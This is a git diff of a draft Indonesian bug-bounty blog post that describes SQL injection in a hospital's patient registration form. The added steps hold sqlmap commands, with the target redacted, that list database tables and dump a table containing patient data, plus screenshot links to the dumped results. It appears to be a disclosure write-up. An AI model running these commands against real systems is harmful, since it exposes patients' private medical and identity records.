@@ -3,7 +3,7 @@ title: "P1 SQL Injection Form Pendaftaran Rumah Sakit"
 date: 2023-12-28T13:39:57+07:00
 draft: true
 tags:
-- Bug Bounty
+- bugbounty
 ---
 Saat akan daftar disalah satu rumah sakit tiba tiba kepikiran bisa gak sih form iin di inject?
 # POC
@@ -24,7 +24,17 @@ sqlmap -u https://redacted.com/index.php/CProsesDaftar/getpasien" --data="nomrm=
 
 4. Lihat isi table salah satu database
 ```
-sqlmap -u "https://redacted.com/index.php/CProsesDaftar/getpasien" --data="nomrm=Halo&tgllahir=2025-05-07&nik=9827982798279827&search=nomrm&tglperiksa=2023-12-07" --level 5 --risk 3 --banner --ignore-code 401 --technique=B --flush --threads 2 -D redactedname --tables
+sqlmap -u "https://redacted.com/index.php/CProsesDaftar/getpasien" --data="nomrm=Halo&tgllahir=2025-05-07&nik=9827982798279827&search=nomrm&tglperiksa=2023-12-07" --level 5 --risk 3 --banner --ignore-code 401 --technique=B --flush --threads 2 -D redacted-database --tables
 ```
 
-5. 
+
+![Table](https://raw.githubusercontent.com/bembenk18/Images/main/SQLI-Rumah_Sakit/4.png)
+
+5. Dump table 
+```
+ sqlmap -u "https://redacted.com/index.php/CProsesDaftar/getpasien" --data="nomrm=Halo&tgllahir=2025-05-07&nik=9827982798279827&search=nomrm&tglperiksa=2023-12-07" --level 5 --risk 3 --banner --ignore-code 401 --technique=B --flush --threads 2 -D redacted-database  -T redacted-table --dump
+```
+
+6. Hasil dump adalah file .csv yang jika dibuka akan menampilkan informasi dibawah ini
+
+![Hasil](https://raw.githubusercontent.com/bembenk18/Images/main/SQLI-Rumah_Sakit/5.png)
